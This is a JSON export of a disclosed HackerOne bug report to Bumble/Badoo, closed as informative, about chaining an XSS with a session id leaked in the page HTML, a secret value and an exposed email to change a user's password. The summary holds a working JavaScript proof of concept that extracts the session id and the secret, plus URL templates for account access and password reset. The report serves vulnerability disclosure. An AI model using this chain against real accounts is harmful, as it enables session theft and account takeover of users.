{
  "id": 119794,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTk3OTQ=",
  "url": "https://hackerone.com/reports/119794",
  "title": "Password modification without knowing actual password & httpOnly bypass",
  "state": "Closed",
  "substate": "informative",
  "readable_substate": "Informative",
  "created_at": "2016-03-01T16:30:23.122Z",
  "submitted_at": "2016-03-01T16:30:23.122Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ngocdh",
    "url": "/ngocdh",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 21554,
    "url": "https://hackerone.com/bumble",
    "handle": "bumble",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/554/13fb93fae5496e8e259a0f2a2fba3a72ca10550b_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/554/13fb93fae5496e8e259a0f2a2fba3a72ca10550b_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Bumble",
      "twitter_handle": "bumble",
      "website": "https://bumble.com/",
      "about": "Bumble - Date, Meet, Network Better"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-04-12T19:20:42.808Z",
  "bug_reporter_agreed_on_going_public_at": "2016-03-16T12:15:24.072Z",
  "team_member_agreed_on_going_public_at": "2016-04-12T19:20:42.732Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-04-15T12:15:24.229Z",
  "allow_singular_disclosure_after": -247103074.82076088,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "n1m0",
    "sameerphad72",
    "term1nal",
    "dz_samir",
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 1662,
      "category": "team",
      "content": "Two issues:\n\nSession cookie is returned in HTML source code of /encounters page, which would allow an XSS attacker to steal it, even if httpOnly is activated.\nA secret value, present in HTML source code of some api.phtml pages, can be used to modify user's password without knowing actual one.\nPrivacy issue : user's email address, hiden in user interface, can be found when sending a POST request to /api.phtml?SERVER_APP_STARTUP\nCombining these three issues, an XSS attacker can steal session cookie and modify user's password without knowing actual one.\n\nThe following POC (works in Chrome latest version) bypasses HttpOnly to retrieve the session cookie, and then do a POST to /api.phtml to retrieve the secret value (see Screenshot):\n\n/POC - BEGIN/\nvar xmlhttp = new XMLHttpRequest();\nxmlhttp.onreadystatechange = function() {\nif (xmlhttp.readyState == XMLHttpRequest.DONE) {\na=xmlhttp.responseText.substr(xmlhttp.responseText.search(\"session_id\\\":\\\"\")+13);b=a.substr(0,a.search(\"\\\"\"));//alert(b);\nvar xmlhttp2 = new XMLHttpRequest();\nxmlhttp2.onreadystatechange = function() {\nif (xmlhttp2.readyState == XMLHttpRequest.DONE) {\na2=xmlhttp2.responseText.substr(xmlhttp2.responseText.search(\"secret=\")+7);b2=a2.substr(0,a2.search(\"\\\"\"));alert(b2);\n}\n}\nxmlhttp2.open(\"POST\", \"/api.phtml?SERVER_GET_USER\");\nxmlhttp2.setRequestHeader(\"Content-Type\", \"json\");\nxmlhttp2.setRequestHeader(\"X-Session-id\", b);\nxmlhttp2.send(JSON.stringify({\"$gpb\":\"badoo.bma.BadooMessage\",\"version\":1,\"message_type\":403,\"message_id\":13,\"body\":[{\"$gpb\":\"badoo.bma.MessageBody\",\"message_type\":403,\"server_get_user\":{\"$gpb\":\"badoo.bma.ServerGetUser\",\"user_id\":$s.user_id.toString(),\"user_field_filter\":{\"$gpb\":\"badoo.bma.UserFieldFilter\",\"projection\":[100]},\"client_source\":0}}]}));\n}\n}\nxmlhttp.open(\"GET\", \"/encounters\",true);\nxmlhttp.send();\n/POC - END/\n\nNote that with the \"secret\" value and user's UID, an attacker can access user's account anytime using the following URL:\nhttps://eu1.badoo.com/access.phtml?UID=[UID]&secret=[secret]\n\nSimilarily, user's email can be retrieved by send POST request to /api.phtml?SERVER_APP_STARTUP.\n\nThe attacker can then go to the following URL to change user's password:\nhttps://eu1.badoo.com/forgot_enter.phtml?code=[secret]&email=[email]",
      "user": {
        "id": 5780,
        "username": "uyga",
        "name": "Ilya Ageev",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2014-05-03T13:03:54.979Z",
        "url": "https://hackerone.com/uyga",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/005/780/942fbff2730b14a4cb3450a1c78b108cf3abbe91_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
